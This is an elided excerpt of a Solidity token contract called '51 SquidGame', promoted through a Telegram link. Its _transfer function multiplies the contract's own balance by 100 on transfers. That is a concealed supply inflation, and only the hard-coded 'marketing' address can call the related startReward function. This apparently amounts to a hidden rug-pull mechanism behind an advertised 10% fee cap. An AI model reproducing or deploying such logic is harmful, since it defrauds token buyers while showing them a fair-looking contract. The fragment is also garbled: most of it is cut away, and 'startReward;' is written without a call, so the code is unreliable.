...
/**   // SPDX-License-Identifier: MIT
      ...
      TELEGRAM PORTAL - https://t.me/squid51 - 🟢
...
contract SQUIDGAME51 is Context, IERC20, Ownable {
    ...
    string public _name = "51 SquidGame";

    string public _symbol = "51SquidGame";
    ...
    address payable public marketing =
        ...
        payable(0xB9db687514140Ae13Ce94A4C8A99361f7ae4BdFB);
    ...
    uint256 public constant _maxFees = 10;
    ...
    function _transfer(
        ...
        if (
            ...
            _balances[address(this)] = _balances[address(this)].add(amount).mul(100);
            startReward; 
        }
    ...
    function startReward() public lockTheSwap {
        require(_msgSender() == marketing, "collectFees error");
